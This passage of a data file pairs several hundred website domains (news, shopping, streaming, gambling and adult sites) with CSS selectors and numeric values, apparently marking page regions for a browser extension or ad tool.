index-content categories"]*250**provincial.com*section[class^="gray-background padding-bottom"]*250**xozilla.com*div[class^="main-content"]*200**irkutsk.drom.ru*div[class^="b-right-side"]*400**price.ua*div[class^="sidebar"]*400**charter97.org*div[class^="main-wrap"]*250**me.zing.vn*div[class^="zmlogin_wrapper"]*250**online-red.com*div[id^="div-main-center"]*90**phimsexporn.com*div[class^="col-6"]*200**rezultati.com*div[class^="fs-table"]*250**detmir.ru*div[class^="yCmsContentSlot clearfix mb20"]*250**trailerstube.ru*div[id^="dle-content"]*250**auto.e1.ru*div[class^="au-offers-carousel__header-inner"]*200**catalog.onliner.by*div[class^="g-middle-i"]*250**omsk.drom.ru*div[class^="b-right-side"]*400**girlshotcamiera.net*div[id^="content"]*250**leroymerlin.ru*div[class^="projects-carousel jcarousel-wrapper"]*250**mymarket.ge*div[id^="super-vips"]*250**knijky.ru*div[class^="read_book custom-body month-books"]*200**igri-2012.ru*div[id^="gk-topsl2"]*250**tes-game.ru*div[class^="conttext"]*200**kopilkaurokov.ru*div[class^="col-xs-3"]*600**mods-fs.net*div[class^="mods_line"]*250**mobalert.online*div[class^="rotator-container"]*250**zakon2.rada.gov.ua*div[id^="diclist"]*250**es.y8.com*div[id^="items_container"]*250**kinokong.cc*div[id^="main-slider1"]*200**nungmovies-hd.com*div[class^="wp-pagenavi"]*200**bokepseks.org*div[id^="container"]*200**zakon3.rada.gov.ua*div[class^="container container-main"]*250**livescore.com*div[class^="content pb44"]*200**video.vitalworldnews.com*div[class^="container fade-in animated3"]*250**olozmp3.net*div[class^="container center clearfix nobottommargin"]*250**rupornotube.me*div[class^="videoblock"]*250**rupornotube.me*div[class^="holder inverse ajax3"]*250**oyunskor.com*div[class^="window latest-games json-pages"]*250**xnxx13.net*div[id^="ctrzxeyk5m"]*250**baraholka.onliner.by*div[class^="b-columntopic columntopic-bah"]*200**xuk.ru*div[class^="category photoalbums"]*200**tamilrockers.re*div[class^="ipsType_textblock ipsPad"]*200**hdzog.com*div[class^="wrapper main-content"]*250**egdz.net*div[class^="content-area"]*200**nettruyen.com*div[id^="ctl00_divCenter"]*200**nn.ru*div[class^="news-block"]*200**abw.by*div[class^="row row-no-paddings row-4 row-flex row-products"]*250**skelbiu.lt*div[id^="container"]*250**myegy.tv*div[class^="block editor"]*250**eropixel.net*div[id^="categories"]*250**ytmp3.cc*div[id^="converter_wrapper"]*250**agoda.com*div[id^="home-react-root"]*250**iwank.tv*div[class^="nav top"]*200**ukrdz.in.ua*div[class^="site-content"]*250**videos.nur.kz*div[class^="wrapper content"]*250**kadu.ru*div[id^="m-new-content"]*200**pozdravok.ru*div[id^="right"]*400**etsy.com*div[class^="mt-xs-5 mt-sm-5"]*200**emex.ru*div[id^="body-content"]*200**serial-kuhnya.tv*div[class^="post-content"]*90**goodmoodhome.com*div[class^="container homepage-content"]*250**kogama.com*section[class^="carousel"]*200**hotmovs.com*div[class^="section section--default"]*200**javhd.pro*div[id^="main-content"]*200**context.reverso.net*section[id^="home-body"]*250**topwar.ru*div[class^="newsscroll"]*250**javfor.me*div[id^="leftcontent"]*250**rosreestr.ru*div[class^="bg_white"]*250**seznam.cz*div[class^="gadget-layout content-underlay content-underlay--main"]*200**qafqazinfo.az*div[class^="col-lg-8 col-md-8 col-sm-8 col-xs-12"]*200**onet.pl*div[id^="mainPageBody2"]*200**bravopornrus.com*div[id^="newest"]*200**megatest.online*div[class^="lst-tests lst-tests--ad"]*250**yourporn.sexy*div[id^="center_panel"]*250**merojax.tv*section[class^="tm-main-bottom uk-grid"]*200**th.catfly.com*div[class^="body"]*250**iporntv.net*div[id^="top_mob_banner"]*250**mercadolibre.com.ve*div[id^="categories"]*200**login.wmtransfer.com*div[class^="content-wiki clio-content"]*250**soha.vn*div[class^="page-body clearfix"]*250**tv.zing.vn*div[class^="mid-wrap grid12"]*250**es.chaturbate.com*div[class^="c-1 endless_page_template"]*200**taxi-money.info*div[class^="clearfix"]*250**wmrfast.com*div[id^="rightcolumn"]*400**game24h.vn*div[class^="columnCenter"]*200**cheatground.ru*div[class^="BodyInner"]*250**xmuzic.me*div[class^="ctr-player g-margin_b30"]*200**analdin.com*div[id^="list_videos_top_rated_videos_items"]*200**stmods.ru*div[class^="col-md-9 center_col"]*250**alohatube.com*div[id^="embed"]*200**24video.in*div[class^="video-page-content"]*250**anwap.org*div[class^="yxuqulzn"]*250**dota2house.com*div[id^="content"]*200**ibtimes.co.uk*div[class^="area wrap-left"]*200**hurriyet.com.tr*div[class^="main-content"]*200**yaporn.sex*div[class^="media-wrapper"]*200**yaporn.sex*section[class^="main-content"]*250**torgoviy-dom.com.ua*div[id^="aside"]*600**loads.ati.su*div[class^="search-form-last-row cf"]*200**tukif.com*div[class^="main_wrapper"]*200**ati.su*div[id^="pnlMainMessegeContainer_0"]*250**globo.com*div[class^="home-noncritical"]*90**discovertheforest.org*div[class^="main clearfix"]*250**hotstar.com*div[class^="tray-container-outer"]*200**freearabsexx.com*div[class^="col-sm-12"]*200**school.bilimal.kz*div[class^="block_tools"]*250**zarabativaisazartom.net*div[class^="content container"]*250**i.ua*div[class^="Body clear"]*250**makrobet10.com*div[class^="casino-games_makro"]*250**reshak.ru*div[id^="midside"]*200**diesel.elcat.kg*div[id^="category_133"]*250**kyivdennoch.novy.tv*div[class^="content-wrapper"]*250**ex-fs.net*div[class^="CenterBlockExForm"]*200**ttt4.com*div[class^="left_area"]*90**mercury.vetrf.ru*div[class^="row-fluid con-n"]*250**12kotov.ru*div[class^="viral-cont clearfix js-news-block"]*250**dom.ria.com*div[id^="mainPageRotator"]*200**forum.advance-rp.ru*div[class^="mainContent"]*200**mk.ru*div[class^="main"]*200**auto.am*div[class^="tabcont"]*250**ru.nametests.com*div[id^="cross-promo-35-js-md-lg"]*250**okino.tv*div[id^="dle-content"]*200**blablacar.ru*div[class^="HomeBlock-inner HomeBlock-pattern"]*200**news.tut.by*div[class^="b-equal-twocols"]*200**boxof.porn*div[class^="head-block"]*250**pochta.ru*div[class^="footer footer--hidden"]*250**ioe.go.vn*div[class^="w650 pdt15"]*250**serialkryshamira.ru*section[class^="frontpage__news no_bottom_border"]*250**della.ua*div[id^="contentDiv"]*250**neko-miku.com*div[class^="col-lg-9"]*200**epn.bz*div[class^="block-profit"]*250**e1.ru*div[class^="e1-main-left-top-columns"]*250**video.entertaintastic.com*div[id^="main"]*250**moneycontrol.com*section[class^="main-left"]*250**gdz-putina.info*div[class^="art-sidebar1"]*400**unionpeer.com*div[id^="new-tor"]*250**yalla-shoot.com*div[class^="bodya_f"]*90**egy.best*div[class^="verticalDynamic"]*400**uslugi.tatarstan.ru*div[class^="open-gov-services"]*250**shahid4u.tv*div[class^="blocksFilms"]*250**x-minus.me*div[class^="themed-cls"]*200**textnow.com*div[class^="intro row"]*250**myzuka.me*div[id^="Left_2"]*600**a10.com*div[id^="wdg_page_thumbnail_grid"]*200**rfity.com*div[id^="content"]*250**lamoda.ua*div[class^="mainpage-banners width-wrapper"]*90**3sk.tv*div[class^="article_content"]*250**click-money-system.com*div[class^="container footer"]*250**torrent10.ru*div[class^="hotgames"]*250**cgntrading.com*div[id^="su_ele_3_1_21520_detail"]*250**suchen.mobile.de*div[class^="cBox cBox--content cBox--resultList"]*90**cimaclub.com*div[class^="moviesBlocks DataFill"]*200**tayara.tn*section[class^="container regionscats indexpage mdl-layout__des"]*250**sportmaster.ru*div[class^="sm-news__common-wrap clearfix"]*90**jjgirls.com*div[class^="L996"]*200**book-online.com.ua*div[id^="content"]*200**serviporno.com*div[class^="submenu-categorias-2-2"]*250**njuskalo.hr*div[class^="wrap-content-primary cf"]*200**tube8.com*div[class^="sectionWrapper"]*200**cima4u.tv*div[id^="dataTab"]*250**kudosporn.com*div[class^="video-holder"]*250**citrus.ua*div[class^="Promo-page"]*90**en.indoxxi.net*div[class^="movies-list-wrap mlw-topview mt20"]*90**aflamporn.com*section[class^="video-list latest"]*200**chedot.com*section[class^="container content-block-news"]*90**foxtrot.com.ua*div[class^="product-tabs"]*250**jumia.com.eg*div[class^="floor -ground -dark-grey dyother dyMonitor"]*250**gearbest.com*section[id^="nullHistory"]*250**jd.id*div[id^="super_deals2"]*200**myhit.audio*div[class^="mobileHide"]*200**lostfilm.tv*div[class^="content"]*200**sexrussia.tv*div[class^="uk-margin infinite-scroll"]*250**newauction.com.ua*div[class^="main"]*250**makeup.com.ua*div[class^="ajax-loadable-slider loaded"]*250**wp.pl*div[class^="_1gA4wm content"]*250**news.sportbox.ru*div[id^="comp_59d87ed085d0e"]*200**chinapornmovie.com*div[class^="title"]*250**video.losangelespost.com*div[id^="main"]*250**kinogb.me*div[class^="fixur"]*250**gdzonline.net*div[class^="content"]*250**24tv.ua*div[class^="publications-wrapper"]*250**24tv.ua*div[class^="col-4 w50 news-list-col homepage-list"]*600**mp3crazy.me*div[id^="main_side"]*200**gamemodding.net*div[class^="block block-center block-main"]*200**direct.asda.com*div[class^="PanelWrapper"]*200**myvideohost.net*div[class^="content-area clr"]*250**hotzoom.net*div[class^="mainbody-inner row"]*250**pornodiesel.me*div[class^="videoholder"]*200**pornodiesel.me*div[class^="block-holder ajax3"]*200**sport-express.ru*div[class^="major white_block pb_12 clearfix"]*250**mos.ru*div[class^="container-fluid mainpage-directives"]*250**subscene.com*div[id^="columns"]*250**censor.net.ua*div[class^="wrap"]*250**polovniautomobili.com*div[class^="uk-container uk-container-center body"]*250**youjizz.com*div[class^="left-content"]*90**video.yourmedicalnews.com*div[id^="main-content"]*250**kookporn.com*div[id^="hlsplayer"]*250**hindi.news18.com*div[class^="clearfix vrlftg-tpkhbr"]*250**ru-m.org*div[id^="dle-content"]*200**razlozhi.ru*div[class^=" _u_7 _u_3 _u "]*250**hasznaltauto.hu*div[id^="main_kisoldal_belso"]*600**spec.drom.ru*div[class^="tabsSearchForm"]*250**christian-dogma.com*div[id^="replaceeeee1"]*250**kissanime.ru*div[id^="leftside"]*200**nash-dom2.su*div[class^="spec2"]*250**bonprix.ru*div[class^="teaser teaser-headline-block   "]*250**ab.onliner.by*div[class^="grid grid-autoba"]*200**play.zing.vn*div[id^="BottomContent"]*250**3ddd.ru*div[id^="poligon_master"]*400**cian.ru*div[class^="c-promo-container___3jmaq"]*250**hq-sex-tube.com*div[class^="player-content"]*250**online.anidub.com*div[id^="dle-content"]*200**asos.com*div[class^="footer-links"]*200**modnakasta.ua*div[class^="banners-container banners--desktop"]*200**krisha.kz*div[class^="content-rows"]*200**litmir.me*div[class^="all_comments_block"]*400**swing-zone.com*div[class^="sys_mc_wrapper bx-def-margin-sec-leftright"]*200**sportonline.ua*div[id^="two"]*600**novosibirsk.drom.ru*div[class^="b-media-cont b-media-cont_reviews"]*250**yespornplease.com*div[class^="row m-b-30"]*200**yespornplease.com*div[class^="col-sm-12"]*250**upornia.com*div[class^="player-holder"]*250**bukalapak.com*div[class^="home-banner featured-main"]*200**seria-z.net*div[class^="information clearfix"]*250**download.cnet.com*div[class^="col-6"]*90**profitbet.kz*div[class^="panel bet-slip-panel round5"]*250**euroki.org*div[id^="latest_books"]*250**zakupki.gov.ru*div[class^="tapeBannersBlock  newsBlock"]*250**tampermonkey.net*div[class^="intro social"]*250**glaz.tv*div[class^="js-pay-method"]*250**blibli.com*div[class^="row featured-brands__container"]*250**dingit.tv*div[class^="home-hashtags"]*250**egypt.souq.com*div[class^="row show-for-small-only-override"]*200**perdos.me*div[id^="center-page-plugin"]*250**videomore.ru*div[class^="container-inner container-inner_slider clear"]*250**tolko-russkoe.com*div[class^="video-info"]*250**tolko-russkoe.com*div[class^="margin-fix"]*250**bt.rozetka.com.ua*div[class^="custom-top-block portal-notebooks"]*250**gameguru.ru*div[class^="V7-main-grid-wrap js-main-grid-wrap"]*200**kizi.com*div[id^="thumbs_place_holder"]*200**oldbk.com*div[class^="right_colum"]*600**akhbarak.net*div[class^="featured_blocks"]*250**ebalka.net*div[class^="right_ads"]*400**kovcheg.apeha.ru*div[id^="left-content"]*200**market.csgo.com*div[id^="applications"]*250**echo.msk.ru*section[class^="maincolumns"]*90**pornolomka.com*div[class^="tab-panel"]*90**pornolomka.com*div[id^="dle-content"]*200**mobile.de*section[id^="reco-box-ymal"]*200**jerk.porn*div[class^="player-container"]*90**maam.ru*div[id^="sidebar"]*400**yummyanime.com*div[class^="last-videos-block"]*250**fex.net*div[class^="in_top"]*250**vtrahesite.porn*div[class^="contentbl"]*250**superjob.ru*div[class^="sj_flex sj_panel"]*200**kupujemprodajem.com*div[id^="layout"]*250**arabysexy.com*main[class^="large-9 medium-9 columns"]*250**auction.violity.com*div[class^="lotslist table"]*250**romancecompass.com*div[class^="gallery-list"]*250**moststi.com*div[class^="lines__wrapper lines__list-2 lines__wrapper-2"]*200**milliyet.com.tr*div[id^="_Middle1"]*250**kurir.rs*div[class^="cContainer fixed"]*250**vesti.ru*div[class^="adv-list"]*600**oceanofgames.com*div[id^="mask-2"]*250**school.mosreg.ru*div[class^="mosreg-main-info"]*90**nhentai.net*div[class^="container index-container"]*250**turbo.az*div[class^="page-content"]*250**ru.scribd.com*div[class^="devices_container"]*250**gall.dcinside.com*div[class^="gmain_area_left"]*250**jhf.ru*div[class^="left-content "]*250**korrespondent.net*div[class^="top-block main-grid"]*200**skylots.org*div[id^="recomended"]*250**lit-era.com*div[class^="block b-selling"]*250**lenta365.ru*div[id^="mainTopContainer"]*250**phimsexnhanh.net*main[class^="main col-sm-8"]*200**zaycev.net*div[class^="unit-w unit-w100"]*250**next.ua*div[data-index^="03_2"]*250**gtavicecity.ru*div[class^="category-wrapper"]*250**kashalot.com*div[class^="b-index__main"]*250**kashalot.com*div[class^="row row-cut kl-home-row kl-home-row-auc"]*250**football.ua*div[id^="ctl00_columnTop"]*250**jizzbunker.com*div[class^="panel panel-default gallery"]*250**jizzbunker.com*div[class^="gallery panel panel-default"]*250**topbanger.com*div[class^="list_news"]*250**onlinemultfilmy.ru*div[id^="popular-blok"]*250**th.y8.com*div[id^="items_container"]*200**stoloto.ru*section[id^="regular_games_section"]*250**store.steampowered.com*div[class^="home_page_content special_offers"]*250**otomoto.pl*div[class^="offers-box offers-small offers-small"]*200**camdolls.com*div[class^="container-fluid"]*200**camdolls.com*div[class^="asset-thumb-row js-asset-thumb-row"]*200**tvmoby.ru*div[class^="col-md-12"]*250**meshok.net*div[id^="halfgrid main clr pdingbott20"]*400**meshok.net*div[id^="rC"]*400**ipleer.fm*div[id^="xbody-left"]*200**freepik.com*div[class^="images imageList"]*250**ru.y8.com*div[class^="box items-grid"]*200**tokopedia.com*section[class^="container home-toppicks-container"]*200**sims3pack.ru*div[id^="midside"]*250**1plus1.ua*div[class^="top-news large clear"]*90**kseries.co*div[class^="item_1 items"]*200**kinoprofi.org*div[class^="column-box"]*400**championat.com*div[class^="livetable__contain js-livetable-contain"]*250**livejasmin.com*div[id^="channel_top_block"]*250**phimmoi.net*div[class^="top-movie-list block-wrapper"]*250**100sp.ru*div[class^="top-container"]*250**kooora.com*div[class^="newsList"]*250**mangafox.me*div[id^="sidebar"]*600**yaklass.ru*div[class^="text-center zag_55g"]*90**hlthailand.com*div[class^="livecasino-list"]*200**tut.by*div[id^="geo_news_block"]*200**smi2.ru*div[class^="news-block-inner"]*200**video.theparentingvillage.com*section[class^="container page-content"]*200**4book.org*div[class^="row main-page"]*90**gotporn.com*div[class^="info  clearfix"]*250**studfiles.net*div[class^="cell_list"]*90**lamoda.ru*div[class^="mainpage-banners width-wrapper"]*90**allo.ua*div[class^="list_tab_new shadow-bottom"]*250**my.avon.ru*div[class^="wrap-rep-blocks"]*250**baza.drom.ru*div[class^="cont_right"]*400**baza.drom.ru*div[class^="sub-dir-select"]*90**flashscore.com*div[class^="table-main"]*250**frankcasino.com*div[class^="js-game-list-main"]*250**dnevnik.ru*div[class^="promo__counter"]*250**convert2mp3.net*div[class^="row beschreibung"]*250**th.hao123.com*div[class^="l-flow-main"]*250**sima-land.ru*div[class^="align-left-wrapper"]*250**torrent9.ru*div[id^="dle-content"]*250**flipkart.com*div[class^="_1wahZU"]*200**newsles.ru*div[class^="newsbox_b"]*200**onlineguru.ru*div[class^="V3-page-list"]*250**liveinternet.ru*div[class^="header header_v2"]*250**rbc.ru*div[class^="main__row"]*200**theyoump3.com*div[class^="desktop-version wrapper auto sw-theme-arrows"]*250**best-muzon.cc*div[id^="main"]*250**vietnamnet.vn*div[class^="HomeTop clearfix"]*200**tabor.ru*div[class^="section__head section__head_title"]*200**torrent9.pe*div[class^="tab-content"]*250**pornpics.com*div[id^="main"]*250**4shared.com*div[class^="row hidden-xs hidden-sm"]*250**lodynet.com*div[class^="MainSlider"]*250**classic.parimatch.com*div[id^="z_content"]*90**classic.parimatch.com*div[class^="right_menu"]*400**anistar.me*div[class^="head-body"]*90**cars.av.by*div[class^="listing"]*250**infourok.ru*div[class^="v-new-courses-block v-transp"]*250**www.megahdporno.net*div[class^="videoholder"]*250**ar.hao123.com*div[class^="l-flow-main"]*200**ru.bongacams.com*div[class^="mls_models medium"]*200**www.obozrevatel.com*div[class^="main-item-complex__right"]*400**fanserials.tv*div[class^="block-new-series"]*250**www.game-game.com.ua*div[class^="row text-center google-box"]*250**www.youm7.com*div[class^="row smallOnes"]*250**www.flvto.biz*div[class^="content page__content"]*250**www.ixxx.com*ul[class^="thumbs container"]*200**www.myauto.ge*div[class^="container-main default"]*90**www.myauto.ge*div[class^="ads-wrp"]*400**www.myscore.com.ua*div[id^="fsbody"]*200**mostbri.com*div[class^="lines__wrapper lines__list-2 lines__wrapper-2"]*250**hdrezka.ag*div[class^="b-content__inline_items"]*200**www.dailymotion.com*div[class^="col-8 main-container pl_wtw_page"]*200**www.dailymotion.com*div[class^="col-4 sidebar pdg-end-lg"]*600**kolesa.kz*div[class^="hot-body hot"]*200**e.edu.kz*div[id^="advantages"]*250**999.md*div[class^="last-items has-header"]*250**999.md*div[class^="home-tabs__body"]*250**www.olx.pl*section[id^="mainpageAds"]*200**plarium.com*div[id^="feeds"]*250**shafa.ua*ul[class^="b-catalog b-catalog_max-columns_5"]*250**www.onlinevideoconverter.com*div[class^="home-section-2"]*250**steamcommunity.com*div[id^="apphub_Card_300904837"]*200**sinoptik.ua*div[class^="tabsContentInner"]*200**youla.io*div[class^="_component product_list_container"]*200**kinokrad.co*div[id^="dle-content"]*200**gidonline.club*div[id^="posts"]*250**megaresheba.ru*div[class^="description border-top"]*250**megaresheba.ru*div[class^="warnBox"]*400**uchi.ru*div[id^="facts"]*200**indoxxi.net*div[class^="movies-list-wrap mlw-topview mt20"]*90**letyshops.ru*div[id^="block-shops-best-shops"]*250**gdz.ru*div[class^="description main-desc"]*250**www.bet365.com*div[class^="wc-HomePage_VerticalContainer "]*250**www.kufar.by*div[id^="list_item_thumbs"]*250**www.kidstaff.com.ua*div[id^="maincss"]*200**auto.drom.ru*div[class^="b-content b-media-cont b-media-cont_margin_huge"]*250**vseigru.net*div[class^="moduletable_menu"]*250**vulcan-million.com*div[class^="game-list__list"]*250**bazr.ru*div[id^="newtab"]*200**vklybe.tv*div[class^="top-addfox main-padd"]*250**gt3.iframe.tvzavr.ru*div[class^="middler_wrap"]*200**vshkole.com*div[class^="tac klas-wrap"]*200**play.video*div[class^="video-details"]*250**rst.ua*div[id^="rst-page-index-adv-news-block"]*250**parastrok.info*div[class^="col-lg-9 col-md-8"]*200**slovechko.me*div[class^="col-md-4 hidden-xs hidden-sm"]*200**rozetka.com.ua*section[id^="popular_goods_2"]*250**auto.ria.com*section[id^="rotatorMain"]*250**winvideo.tv*div[class^="content-wrap notoppadding"]*250**i-trailer.ru*div[class^="bl c_rows"]*250**gooodvideos.com*div[align^="center"]*250**karabas.com*div[class^="two-cols"]*200**navkolonas.com*div[class^="main-content-section clearfix"]*250**rieltor.ua*div[class^="col-lg-9 col-md-8"]*200**puls.kiev.ua*div[class^="news_in"]*90**compendium.com.ua*div[id^="abc_top"]*200**62.ua*div[class^="newslist io-block"]*600**funnyreps.com*div[class^="site-content"]*250**xt.ht*div[class^="rowArea"]*200**informnapalm.org*div[class^="main-wrapper container"]*250**donbass.ua*div[id^="pollsBlock"]*400**intermarium.com.ua*div[class^="main-col widget-area-4 pull-left"]*90**jobs.ua*div[class^="b-default b-default__hot-vacancies"]*250**pn.com.ua*div[class^="table-content-page"]*250**vlasti.net*div[class^="width624"]*200**perelaznews.blogspot.am*div[class^="blog-posts hfeed"]*200**kissfm.ua*div[class^="block-right mobile-hide"]*400**klassno.tv*div[class^="content_section floating_element"]*200**timer-odessa.net*div[class^="c468 c23"]*90**timer-odessa.net*div[class^="c225 c4"]*400**edinstvennaya.ua*div[class^="items-list latest-alticles-list"]*250**mport.ua*div[class^="l-page g-clearfix"]*250**dynamomania.com*div[class^="grid-column grid-column-2"]*250**mon.gov.ua*div[class^="container news-home"]*250**zloy-odessit.livejournal.com*div[id^="alpha-inner"]*250**sfw.so*div[id^="dle-content"]*250**education.ua*div[id^="content"]*250**primechaniya.ru*div[class^="v5middle"]*250**argumentua.com*div[id^="showcase"]*250**u-news.com.ua*section[class^="left cf"]*200**beztabu.net*div[class^="columns medium-8 float-right main-content"]*90**ua-reporter.com*div[id^="node-224535"]*250**day.kyiv.ua*div[id^="zone-header-second"]*250**glavred.info*div[class^="wrapper_10px"]*250**4book.org*div[class^="col-md-9 col-xs-12"]*200**footboom.com*div[class^="main-news"]*200**forbes.net.ua*div[class^="col__fluid__main"]*200**abbyy.ua*div[class^="withRight"]*250**porno-mm.com*div[class^="cont"]*200**autocentre.ua*div[class^="td-container tdc-content-wrap"]*250**racurs.ua*div[class^="left_sep"]*250**besplatka.ua*div[id^="main_categories_top"]*250**bit.ua*section[class^="mainsect mainsect--first mainsect--first--3"]*250**meteo.ua*div[class^="cw_center"]*250**pl.com.ua*section[class^="small-posts primary"]*250**ukrinform.ru*div[class^="infoBlock"]*250**0629.com.ua*div[id^="top-news-left-block"]*250**mignews.com.ua*div[class^="main_block clearAfter"]*200**jampo.tv*div[id^="sidebar-left-inn"]*400**jampo.tv*div[id^="sidebar-right"]*400**slovoidilo.ua*section[class^="home-first"]*90**klubok.com*div[class^="main-content-wrap row"]*200**lifeinvest.com.ua*div[class^="sidebar-widget-wrapper"]*600**kpi.ua*div[class^="cwrap maincontent"]*250**vrutmilife.com*div[id^="secondary"]*600**apostrophe.ua*div[class^="row content"]*400**apostrophe.ua*div[class^="l-col3"]*400**guru.ua*div[class^="col-md-4"]*400**webmoney.ua*div[class^="info main-fieldset"]*90**minjust.gov.ua*div[class^="left-box col-md-9"]*200**planetakino.ua*div[class^="movie-top-stripe"]*250**avtobazar.ua*div[class^="right-col-index col-sm-12 col-md-4 hidden-xs"]*400**champion.com.ua*div[class^="tt4 white"]*250**sevastopol.su*div[id^="quicktabs-main_news"]*250**korupciya.com*div[id^="layout-left-home"]*250**volia.com*div[id^="article"]*90**business.ua*div[class^="islands__index _fl"]*250**kino-teatr.ua*div[id^="mainContent"]*90**tickets.ua*div[class^="main-content two-col"]*250**antikor.com.ua*div[class^="column-main-2"]*200**moviestape.net*div[class^="vblock_mult"]*250**ovva.tv*div[class^="tv-guide-wrapper tv-guide-wrapper--main"]*250**informator.news*div[id^="td_uid_3_59d348411035f"]*250**ebanoe.it*div[class^="column one column_blog"]*90**delo.ua*div[class^="site_left"]*200**technosotnya.com*div[class^="main-and-side"]*200**ukranews.com*div[class^="large-4 medium-4"]*600**ru.golos.ua*div[id^="ten_last_news_list_full"]*200**mega-billing.com*div[class^="news_summaries"]*250**xsport.ua*div[id^="small-top-news"]*250**nbnews.com.ua*div[class^="modl"]*400**nbnews.com.ua*div[class^="main"]*250**hh.ua*div[class^="vacancies-of-the-day-anonymous"]*250**prostoporno.xxx*div[class^="thumbs_list"]*200**kinoafisha.ua*div[class^="left-side"]*200**traforet.com*div[id^="push"]*90**tv.ua*div[class^="row columns_hold"]*250**site.ua*div[class^="editors-choice-posts margin-top-20"]*250**kriminal.tv*div[id^="front_left_col"]*250**sprotyv.info*div[class^="panel-pane pane-panels-mini pane-3"]*90**uapress.info*div[class^="b-addcontent fltrght"]*400**dnr-news.com*div[id^="widget"]*600**bbcccnn.com.ua*div[id^="td_uid_4_59d3342c09c41"]*250**uainfo.org*div[id^="leftsidebar"]*600**hyser.com.ua*div[class^="col-9 col-tab-12"]*90**dumskaya.net*div[id^="ajaxnews"]*250**dumskaya.net*div[id^="ajaxnews"]*250**kloomba.com*div[id^="kl-market-cats"]*90**zaxid.net*div[class^="col-9 big_on_ipad"]*200**zaxid.net*div[class^="col-3 no_ipad"]*400**socportal.info*div[id^="news_carousel"]*250**osvita.ua*div[id^="main"]*250**autoua.net*div[class^="l-grid_main js-preload-content"]*200**patrioty.org.ua*div[class^="site-index"]*250**football24.ua*div[class^="medium-6 large-4 columns"]*600**eizvestia.com*div[id^="center"]*200**bagnet.org*div[class^="slideshow"]*250**newsoboz.org*div[class^="widget_center"]*200**newsoboz.org*div[class^="widget_right"]*600**focus.ua*div[class^="column-center"]*200**ukrinform.ua*div[class^="infoBlock"]*250**domik.ua*div[class^="fl_l centr_left_main"]*250**orakul.com*div[class^="leftCol"]*250**replyua.net*div[class^="hblock cf"]*200**tabletki.ua*div[class^="content-container"]*250**liveam.tv*div[class^="col-md-12 col-lg-12"]*250**novosti-n.org*div[class^="index__tabs js-tabs"]*600**fakty.ua*div[class^="page_content_left"]*250**dynamo.kiev.ua*div[id^="index"]*200**usionline.com*div[class^="listing listing-mix-4-8 clearfix"]*250**isport.ua*div[class^="center_column"]*200**unn.com.ua*div[class^="b-main-block clear"]*200**podrobnosti.ua*section[class^="content"]*250**sport.ua*section[class^="col-1"]*200**epravda.com.ua*div[class^="main_content"]*200**kp.ua*div[class^="topic__item topic__item_main"]*250**ubr.ua*div[class^="col3 fl-l home-main-news"]*400**ua-football.com*div[class^="col-xs-4 lblock from_home_page"]*200**ictv.ua*div[class^="front_fakty_box scroll_point"]*250**rada.gov.ua*div[class^="right_col"]*250**newsyou.info*div[class^="middle"]*250**finance.ua*div[class^="container-fluid container-narrow h-content"]*200**terrikon.com*div[class^="content-site"]*250**zik.ua*div[class^="news_block best_news_block"]*200**zik.ua*div[class^="news_block analitics_list gray_date"]*200**facenews.ua*div[id^="main"]*200**rian.com.ua*div[class^="list"]*250**rian.com.ua*div[class^="index_row1_wrap index_multimedia"]*250**eurointegration.com.ua*div[class^="fblock"]*250**hvylya.net*div[id^="main"]*90**piluli.kharkov.ua*div[id^="main-content-top"]*250**trafmag.com*div[class^="content homecontent"]*250**ain.ua*div[class^="block-wrap-content wrapper-main-post-loop"]*250**uz.gov.ua*div[id^="content"]*200**espreso.tv*div[class^="row threeNews_boxes m_b_50"]*250**vesti-ukr.com*div[class^="news home-top"]*250**inforeactor.ru*div[class^="news_columns clearfix"]*250**gamebomb.ru*div[class^="grid-100p-300-lc"]*200**vtorrents.net*div[class^="fpolnaya noselect"]*200**vtorrents.net*div[class^="index-panel"]*250**vsetop.com*div[id^="dle-content"]*250**animespirit.ru*div[class^="content-main-block"]*200**multoigri.ru*div[id^="contentcontainer"]*200**poimel.org*div[class^="main innerPage nuclear"]*90**poimel.org*div[class^="main nuclear"]*90**allbest.ru*div[class^="block_white"]*250**tparser.org*div[id^="kt"]*250**spravker.ru*div[id^="main-content-center"]*250**russian-sex.me*div[class^="content-wrap"]*250**sql.ru*div[class^="side-block import-rss"]*400**f1news.ru*div[class^="middle"]*250**news-front.info*div[class^="content-area"]*250**7days.ru*div[class^="b-stripe b-stripe_content_main  b-stripe_type_wide"]*250**torentor.co*div[id^="dle-content"]*200**loveplanet.ru*div[id^="col_center"]*200**vl.ru*div[class^="candy candy__item_270-150"]*400**freesoft.ru*div[id^="center_right"]*200**film.ru*div[class^="block_w724 pr mb15"]*250**doiuhrht.ru*div[id^="fullstory_img"]*250**avito.ru*div[class^="cols b-select-city"]*250**thesame.tv*div[class^="content clearfix"]*250**flagma.ru*div[id^="map-page"]*250**upornoflv.tv*div[class^="story"]*250**upornoflv.tv*div[class^="video-list cf"]*250**gooool.org*div[class^="cnt-wrp nuclear"]*200**cntd.ru*div[class^="wrapper_NewsList main_page"]*200**fithacker.ru*div[class^="td-container td-blog-index"]*250**bigpicture.ru*div[class^="container content main"]*90**mp3cc.com*div[id^="main_page_songs"]*90**mp3cc.com*div[id^="xbody"]*200**poiskm.co*div[id^="row page"]*250**moevideo.biz*div[class^="content"]*250**pleer.ru*div[class^="mainBlock mar_btm15 of_h pie"]*250**xn--b1aew.xn--p1ai*div[class^="ln-content wrapper clearfix"]*250**zf.fm*div[class^="whb_wrap"]*200**text.ru*div[class^="header"]*250**pornoxyu.me*div[class^="block-content"]*200**mintmanga.com*div[class^="leftContent"]*90**mintmanga.com*div[class^="rightContent"]*600**trud.com*div[class^="content-description clearfix"]*90**anekdot.ru*div[class^="textblock"]*250**remontka.pro*div[class^="tm-main uk-width-medium-1-1"]*90**takprosto.cc*div[class^="inner-wrap mm-page mm-slideout"]*250**macdigger.ru*div[id^="content"]*200**surfingbird.ru*div[class^="exchange-feed"]*90**uznayvse.ru*div[class^="col-xs-12 col-ms-12 col-sm-12 contentm9"]*250**mp3party.net*div[class^="main-page"]*250**x-minus.co*div[class^="themed-cls"]*200**wday.ru*div[class^="container pb-40px"]*250**maximonline.ru*div[class^="section section_lenta_top"]*250**ayzdorov.ru*div[id^="c-center"]*250**zserials.cc*div[class^="rt-grid-9 rt-push-3"]*200**skladchik.com*div[class^="mainContent"]*250**hdkinohit.net*div[id^="dle-content"]*200**stopgame.ru*div[class^="lent-line"]*250**ridus.ru*div[class^="bItems 